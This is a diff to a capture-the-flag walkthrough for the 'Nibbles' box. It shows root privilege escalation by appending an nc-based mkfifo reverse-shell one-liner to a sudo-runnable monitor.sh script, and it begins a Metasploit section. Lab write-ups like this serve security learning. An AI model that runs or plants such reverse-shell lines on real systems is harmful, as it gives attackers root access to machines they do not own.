@@ -139,8 +139,14 @@ The `nibbler` user is able to run `monitor.sh` with `root` privilege. When we fi
 
 Before we do anything, **we must make sure to make a backup of the file and only append changes to the end to avoid overwriting it and causing a disruption!**
 
-Let's append a reverse shell line to the end and execute with `sudo`:
+Let's append a reverse shell line to the end, spawn an `nc` listener on the specified port and execute with `sudo`:
 
 ```shellsession
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [our ip] 8443 >/tmp/f' | tee -a monitor.sh
 ```
+
+We'll upgrade that to a TTY as before, then we can run `cat root.txt` to get the next flag!
+
+## Metasploit
+We saw earlier that there existed a `Metasploit` module that works for this box. It's considerably more straightforward but it's useful to see multiple techniques. Let's close down our reverse shells and work on this.
+
